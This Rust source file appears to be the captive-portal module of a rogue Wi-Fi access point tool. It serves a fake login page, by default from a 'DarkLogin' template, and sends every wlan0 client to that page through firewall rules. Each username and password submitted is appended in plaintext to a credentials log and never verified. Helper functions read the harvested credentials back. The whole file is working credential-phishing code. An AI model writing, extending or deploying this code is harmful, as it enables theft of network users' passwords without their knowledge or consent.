//! Captive portal support.

use std::collections::HashMap;
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::sync::{atomic::{AtomicBool, Ordering}, Mutex, OnceLock};
use std::thread;

#[derive(Clone)]
pub struct PortalConfig {
    pub template_dir: String,
    pub log_path: String,
    pub portal_ip: String,
    pub portal_port: u16,
    pub fallback_port: u16,
}

impl Default for PortalConfig {
    fn default() -> Self {
        PortalConfig {
            template_dir: std::env::var("AP1_PORTAL_TEMPLATE_DIR")
                .unwrap_or_else(|_| "../config/templates/DarkLogin".to_string()),
            log_path: std::env::var("AP1_PORTAL_LOG")
                .unwrap_or_else(|_| "../system/runtime/portal_credentials.log".to_string()),
            portal_ip: std::env::var("AP1_PORTAL_IP").unwrap_or_else(|_| "192.168.50.1".to_string()),
            portal_port: std::env::var("AP1_PORTAL_PORT")
                .ok()
                .and_then(|v| v.parse().ok())
                .unwrap_or(80),
            fallback_port: std::env::var("AP1_PORTAL_FALLBACK_PORT")
                .ok()
                .and_then(|v| v.parse().ok())
                .unwrap_or(8000),
        }
    }
}

impl PortalConfig {
    fn template_path(&self, file_name: &str) -> Option<PathBuf> {
        let candidate = Path::new(&self.template_dir).join(file_name);
        if candidate.exists() {
            Some(candidate)
        } else {
            None
        }
    }

    fn read_template(&self, file_name: &str) -> Option<String> {
        self.template_path(file_name)
            .and_then(|path| fs::read_to_string(path).ok())
    }
}

struct PortalState {
    running: AtomicBool,
    thread: Mutex<Option<thread::JoinHandle<()>>>,
}

static PORTAL_STATE: OnceLock<PortalState> = OnceLock::new();

fn portal_state() -> &'static PortalState {
    PORTAL_STATE.get_or_init(|| PortalState {
        running: AtomicBool::new(false),
        thread: Mutex::new(None),
    })
}

fn build_response(body: &str) -> String {
    format!(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        body.len(),
        body
    )
}

fn login_page(cfg: &PortalConfig) -> String {
    if let Some(template) = cfg.read_template("templates/login.html") {
        return build_response(&template);
    }
    if let Some(template) = cfg.read_template("login.html") {
        return build_response(&template);
    }

    let body = format!(r#"<!DOCTYPE html>
<html lang='en'>
<head><meta charset='UTF-8'><title>AP1 Captive Portal</title></head>
<body>
<h1>Welcome to AP1 Captive Portal</h1>
<p>Portal IP: <strong>{}</strong></p>
<form method='POST' action='/login'>
<label>Login: <input name='login' required></label><br>
<label>Password: <input type='password' name='password' required></label><br>
<button type='submit'>Login</button>
</form>
</body>
</html>"#, cfg.portal_ip);
    build_response(&body)
}

fn success_page(cfg: &PortalConfig) -> String {
    if let Some(template) = cfg.read_template("templates/login_successful.html") {
        return build_response(&template);
    }
    if let Some(template) = cfg.read_template("login_successful.html") {
        return build_response(&template);
    }

    let body = r#"<!DOCTYPE html>
<html lang='en'>
<head><meta charset='UTF-8'><title>Login successful</title></head>
<body>
<h1>Login successful</h1>
<p>Thank you. You may now continue browsing.</p>
</body>
</html>"#;
    build_response(body)
}

fn decode_url_component(component: &str) -> String {
    let mut output = String::with_capacity(component.len());
    let mut bytes = component.as_bytes().iter();
    while let Some(&b) = bytes.next() {
        match b {
            b'+' => output.push(' '),
            b'%' => {
                let hi = bytes.next().copied().unwrap_or(b'0');
                let lo = bytes.next().copied().unwrap_or(b'0');
                let hex = [hi, lo];
                if let Ok(value) = u8::from_str_radix(std::str::from_utf8(&hex).unwrap_or("00"), 16) {
                    output.push(value as char);
                }
            }
            _ => output.push(b as char),
        }
    }
    output
}

fn parse_form(body: &str) -> HashMap<String, String> {
    body.split('&')
        .filter_map(|pair| {
            let mut parts = pair.splitn(2, '=');
            if let (Some(key), Some(value)) = (parts.next(), parts.next()) {
                let key = decode_url_component(key);
                let value = decode_url_component(value);
                Some((key, value))
            } else {
                None
            }
        })
        .collect()
}

fn write_credentials(creds: &str, cfg: &PortalConfig) {
    let path = &cfg.log_path;
    if let Some(parent) = Path::new(path).parent() {
        let _ = fs::create_dir_all(parent);
    }
    if let Ok(mut file) = fs::OpenOptions::new().create(true).append(true).open(path) {
        let _ = writeln!(file, "{}", creds);
    }
}

fn handle_connection(mut stream: TcpStream, cfg: PortalConfig) {
    let mut buffer = [0; 8192];
    if let Ok(size) = stream.read(&mut buffer) {
        let request = String::from_utf8_lossy(&buffer[..size]);
        let request_line = request.lines().next().unwrap_or_default();
        let mut parts = request_line.split_whitespace();
        let method = parts.next().unwrap_or_default();
        let path = parts.next().unwrap_or_default();
        if method == "POST" && path == "/login" {
            let body = request.split("\r\n\r\n").nth(1).unwrap_or_default();
            let values = parse_form(body);
            let login = values
            .get("login")
            .cloned()
            .or_else(|| values.get("username").cloned())
            .unwrap_or_default();
        let password = values.get("password").cloned().unwrap_or_default();
        let creds = format!("login={} password={}", login, password);
            write_credentials(&creds, &cfg);
            let response = success_page(&cfg);
            let _ = stream.write_all(response.as_bytes());
        } else if method == "GET" && path == "/success" {
            let response = success_page(&cfg);
            let _ = stream.write_all(response.as_bytes());
        } else {
            let response = login_page(&cfg);
            let _ = stream.write_all(response.as_bytes());
        }
    }
}

pub fn start_portal() {
    let config = PortalConfig::default();
    start_portal_with_config(config);
}

pub fn start_portal_with_config(cfg: PortalConfig) {
    let state = portal_state();
    if state.running.load(Ordering::SeqCst) {
        println!("captive portal already running");
        return;
    }
    state.running.store(true, Ordering::SeqCst);
    let bind_addr = format!("0.0.0.0:{}", cfg.portal_port);
    match TcpListener::bind(&bind_addr) {
        Ok(listener) => {
            let inner_cfg = cfg.clone();
            let handle = thread::spawn(move || {
                println!("Captive portal started on http://{}", bind_addr);
                for stream in listener.incoming() {
                    if !portal_state().running.load(Ordering::SeqCst) {
                        break;
                    }
                    if let Ok(stream) = stream {
                        handle_connection(stream, inner_cfg.clone());
                    }
                }
            });
            *state.thread.lock().unwrap() = Some(handle);
        }
        Err(err) => {
            eprintln!("failed to bind captive portal on {}: {}", bind_addr, err);
            state.running.store(false, Ordering::SeqCst);
            if cfg.fallback_port != cfg.portal_port {
                println!("Attempting fallback port {}", cfg.fallback_port);
                let fallback = PortalConfig { portal_port: cfg.fallback_port, ..cfg };
                start_portal_with_config(fallback);
            }
        }
    }
}

pub fn stop_portal() {
    let state = portal_state();
    state.running.store(false, Ordering::SeqCst);
    if let Some(handle) = state.thread.lock().unwrap().take() {
        let _ = handle.join();
    }
    println!("captive portal stopped");
}

pub fn is_running() -> bool {
    portal_state().running.load(Ordering::SeqCst)
}

pub fn read_credentials() -> Vec<String> {
    let cfg = PortalConfig::default();
    if let Ok(contents) = fs::read_to_string(&cfg.log_path) {
        contents.lines().map(String::from).collect()
    } else {
        Vec::new()
    }
}

pub fn redirect_all_to_login() {
    println!("captive portal redirect logic enabled.");
    if let Err(err) = crate::system_control::apply_firewall_rules("wlan0", &PortalConfig::default().portal_ip) {
        eprintln!("failed to apply captive portal firewall rules: {}", err);
    }
}

pub fn log_credentials(creds: &str) {
    let cfg = PortalConfig::default();
    write_credentials(creds, &cfg);
}
